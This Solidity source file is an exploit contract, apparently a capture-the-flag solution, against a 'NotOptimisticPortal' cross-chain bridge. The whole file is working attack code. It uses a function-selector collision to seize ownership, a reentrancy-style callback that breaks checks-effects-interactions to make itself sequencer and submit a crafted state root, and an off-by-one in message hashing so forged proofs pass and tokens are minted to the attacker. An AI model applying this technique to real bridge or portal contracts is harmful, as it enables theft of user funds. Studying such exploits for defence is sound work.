// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CallbackExploiter
 * @notice Exploits NotOptimisticPortal via CEI violation + selector collision
 *
 * Attack flow:
 * 1. executeMessage calls portal.transferOwnership(this) - CallbackExploiter becomes owner
 * 2. executeMessage calls this.onMessageReceived(data)
 * 3. In callback, we (as owner) call updateSequencer(this)
 * 4. Then we (as sequencer) call submitNewBlock with crafted state root
 * 5. Verification uses our newly set state root - proofs pass!
 */

interface INotOptimisticPortal {
    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function executeMessage(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt,
        ProofData calldata _proofs,
        uint16 _bufferIndex
    ) external;

    function owner() external view returns (address);
    function sequencer() external view returns (address);
    function governance() external view returns (address);
    function latestBlockHash() external view returns (bytes32);
    function latestBlockNumber() external view returns (uint256);
    function latestBlockTimestamp() external view returns (uint256);
    function bufferCounter() external view returns (uint16);
    function l2StateRoots(uint16) external view returns (bytes32);
    function balanceOf(address) external view returns (uint256);
    function executedMessages(bytes32) external view returns (bool);

    // These functions have special selectors but we call them normally once we're owner/sequencer
    function updateSequencer_____76439298743(address newSequencer) external;
    function submitNewBlock_____37278985983(bytes memory rlpBlockHeader) external;
    function transferOwnership_____610165642(address newOwner) external;
}

contract CallbackExploiter {
    INotOptimisticPortal public immutable portal;
    address public immutable player;

    // Data to be set before attack
    bytes public rlpBlockHeader;
    bool public headerSet;

    // Target selector for onMessageReceived(bytes) == transferOwnership(address)
    bytes4 constant TARGET_SELECTOR = 0x3a69197e;

    event OwnershipClaimed(address newOwner);
    event SequencerSet(address newSequencer);
    event BlockSubmitted(bytes32 newStateRoot);
    event AttackComplete();

    constructor(address _portal, address _player) {
        portal = INotOptimisticPortal(_portal);
        player = _player;
    }

    /**
     * @notice Set the RLP-encoded block header before attacking
     * @param _rlpBlockHeader The crafted block header with our state root
     */
    function setBlockHeader(bytes calldata _rlpBlockHeader) external {
        rlpBlockHeader = _rlpBlockHeader;
        headerSet = true;
    }

    /**
     * @notice This is called during executeMessage via _executeOperation
     * At this point, we are already the owner (from the first operation)
     * We use this callback to set sequencer and submit our crafted block
     */
    function onMessageReceived(bytes calldata /* data */) external {
        require(msg.sender == address(portal), "Only portal can call");
        require(headerSet, "Block header not set");

        // Step 1: We are already owner (transferOwnership was called before this)
        require(portal.owner() == address(this), "Not owner yet");
        emit OwnershipClaimed(address(this));

        // Step 2: Set ourselves as sequencer (we can do this because we're owner)
        portal.updateSequencer_____76439298743(address(this));
        require(portal.sequencer() == address(this), "Not sequencer");
        emit SequencerSet(address(this));

        // Step 3: Submit new block with our crafted state root
        // This modifies l2StateRoots BEFORE _verifyMessageInclusion runs!
        portal.submitNewBlock_____37278985983(rlpBlockHeader);
        emit BlockSubmitted(portal.latestBlockHash());

        emit AttackComplete();
    }

    /**
     * @notice Execute the full attack
     * @param amount Amount of tokens to mint
     * @param salt Salt for message hash
     * @param proofs The Merkle proofs for verification
     * @param bufferIndex Index in l2StateRoots buffer (should point to our new state root)
     */
    function attack(
        uint256 amount,
        uint256 salt,
        INotOptimisticPortal.ProofData calldata proofs,
        uint16 bufferIndex
    ) external {
        require(headerSet, "Set block header first");

        // Prepare message receivers
        // Element 0: portal (for transferOwnership to this contract)
        // Element 1: this contract (for onMessageReceived callback)
        address[] memory receivers = new address[](2);
        receivers[0] = address(portal);
        receivers[1] = address(this);

        // Prepare message data
        // Element 0: transferOwnership(this) - uses selector 0x3a69197e
        // Element 1: onMessageReceived(empty) - uses selector 0x3a69197e
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(TARGET_SELECTOR, address(this));
        data[1] = abi.encodeWithSelector(TARGET_SELECTOR, ""); // onMessageReceived with empty bytes

        // Execute the attack
        // The player receives the minted tokens
        portal.executeMessage(
            player,         // tokenReceiver - player gets the tokens
            amount,         // amount to mint
            receivers,      // [portal, this]
            data,           // [transferOwnership, onMessageReceived]
            salt,           // salt for hash
            proofs,         // Merkle proofs
            bufferIndex     // index to our new state root
        );
    }

    /**
     * @notice Transfer ownership back to player after attack
     */
    function transferOwnershipToPlayer() external {
        require(portal.owner() == address(this), "Not owner");
        portal.transferOwnership_____610165642(player);
    }

    /**
     * @notice Helper to compute the withdrawal hash that will be verified
     * @dev With 2 receivers, only element[0] is included in the hash (off-by-one bug)
     */
    function computeWithdrawalHash(
        uint256 amount,
        uint256 salt
    ) public view returns (bytes32) {
        // With 2 receivers, only first element is accumulated
        // receiver[0] = portal, data[0] = transferOwnership calldata
        bytes memory transferCalldata = abi.encodeWithSelector(TARGET_SELECTOR, address(this));

        bytes32 receiversHash = keccak256(abi.encode(bytes32(0), address(portal)));
        bytes32 datasHash = keccak256(abi.encode(bytes32(0), transferCalldata));

        return keccak256(abi.encode(
            player,          // tokenReceiver
            amount,          // amount
            receiversHash,   // accumulated from element[0]
            datasHash,       // accumulated from element[0]
            salt             // salt
        ));
    }

    /**
     * @notice Get current portal state for debugging
     */
    function getPortalState() external view returns (
        address owner,
        address sequencer,
        bytes32 latestBlockHash,
        uint256 latestBlockNumber,
        uint256 latestBlockTimestamp,
        uint16 bufferCounter
    ) {
        return (
            portal.owner(),
            portal.sequencer(),
            portal.latestBlockHash(),
            portal.latestBlockNumber(),
            portal.latestBlockTimestamp(),
            portal.bufferCounter()
        );
    }
}
